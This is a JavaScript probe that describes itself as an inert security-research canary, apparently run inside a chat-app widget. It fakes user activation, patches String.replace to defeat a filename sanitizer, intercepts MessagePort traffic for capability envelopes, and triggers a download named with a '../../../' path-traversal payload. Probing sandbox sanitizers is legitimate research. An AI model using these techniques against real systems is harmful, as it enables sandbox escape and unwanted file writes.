// T46c - sanitizer localization + neutralization (Pluto Security research canary)
// Patches String.replace/replaceAll in the WIDGET realm: any replace that
// modifies our canary filename is logged and NEUTRALIZED (returns the input
// unchanged). Also logs every MessagePort.postMessage envelope containing the
// download/capability. Then fires ONE anchor download with a path-carrying
// canary name. If the sanitizer lives in the widget realm, the message leaves
// with the RAW name - disk is ground truth. Inert canaries only.
(function () {
  var API = window.oai || window.openai || window.webplus;
  var d = document;

  try {
    Object.defineProperty(navigator, "userActivation", {
      get: function () { return { isActive: true, hasBeenActive: true }; },
      configurable: true
    });
  } catch (e) {}

  window.__t46log = [];
  function log(m) { window.__t46log.push(m); }

  // 1) neutralize any replace()/replaceAll() that modifies our canary name
  [ ["replace", String.prototype.replace], ["replaceAll", String.prototype.replaceAll] ].forEach(function (pair) {
    var name = pair[0], orig = pair[1];
    String.prototype[name] = function () {
      var out = orig.apply(this, arguments);
      try {
        var self = String(this);
        if (self.indexOf("T46c") !== -1 && out !== self) {
          log("SANITIZE-CAUGHT " + name + ": '" + self + "' -> '" + out + "' [NEUTRALIZED - raw name preserved]");
          return self;
        }
      } catch (e) {}
      return out;
    };
  });

  // 2) log download/capability envelopes leaving through MessageChannel ports
  try {
    var origPmp = MessagePort.prototype.postMessage;
    MessagePort.prototype.postMessage = function (m) {
      try {
        var s = JSON.stringify(m);
        if (s && (s.indexOf("capability") !== -1 || s.indexOf("download") !== -1 || s.indexOf("T46c") !== -1)) {
          window.__t46port = { env: m, port: this };
          log("PORT-ENVELOPE: " + s.slice(0, 900));
        }
      } catch (e) { log("port log err " + e); }
      return origPmp.apply(this, arguments);
    };
  } catch (e) {}

  // 3) status box
  var ov = d.createElement("div");
  ov.id = "t46c-ov";
  var css = d.createElement("style");
  css.textContent = [
    "#t46c-ov{position:fixed;left:50%;top:50%;transform:translate(-50%,-50%);z-index:2147483647;width:600px;max-width:calc(100vw - 48px);max-height:calc(100vh - 48px);overflow:auto;box-sizing:border-box;background:#212121;border:2px solid #ff5252;border-radius:12px;padding:20px;font-family:Menlo,Consolas,monospace;font-size:12px;color:#ff8a8a;line-height:1.6}",
    "#t46c-ov b{color:#ff5252;font-size:13px}",
    "#t46c-ov pre{white-space:pre-wrap;word-break:break-all;color:#ffc9c9;margin:6px 0}"
  ].join("");
  ov.appendChild(css);
  ov.innerHTML =
    "<b>T46c RESEARCH CANARY \u2014 Pluto Security (inert)</b><br>" +
    '<div id="t46c-s1">1 firing anchor download (name T46c/../../../raw-canary.txt)...</div>' +
    '<div id="t46c-s2">2 waiting for logs...</div>' +
    '<pre id="t46c-pre"></pre>';
  d.body.appendChild(ov);

  function setS(id, t) { var e = d.getElementById(id); if (e) e.textContent = t; }

  // 4) the single anchor download
  try {
    var blob = new Blob(["T46c research canary - Pluto Security - " + new Date().toISOString() + "\n"], { type: "text/plain" });
    var a = d.createElement("a");
    a.href = URL.createObjectURL(blob);
    a.download = "T46c/../../../raw-canary.txt";
    d.body.appendChild(a);
    a.click();
    a.remove();
    setS("t46c-s1", "1 anchor download fired (name T46c/../../../raw-canary.txt)");
  } catch (e) { setS("t46c-s1", "1 anchor download threw: " + e); }

  setTimeout(function () {
    var logs = window.__t46log;
    setS("t46c-s2", "2 logs (" + logs.length + "):");
    var pre = d.getElementById("t46c-pre");
    if (pre) pre.textContent = logs.join("\n").slice(0, 2000) || "(no sanitize caught, no port envelope seen - sanitizer is NOT in the widget realm)";
    // also mirror to runner document so it survives app rebuilds
    try {
      var p = window.parent;
      var b = p.document.getElementById("t46c-rb");
      if (!b) {
        b = p.document.createElement("div");
        b.id = "t46c-rb";
        b.style.cssText = "position:fixed;left:8px;top:8px;z-index:2147483647;font:11px Menlo,monospace;color:#ff5252;background:rgba(0,0,0,.85);border:1px solid #ff5252;border-radius:4px;padding:4px 8px;max-width:70vw;white-space:pre-wrap";
        p.document.body.appendChild(b);
      }
      b.textContent = "T46c logs (" + logs.length + "):\n" + logs.join("\n").slice(0, 1200);
    } catch (e) {}
  }, 2500);
})();
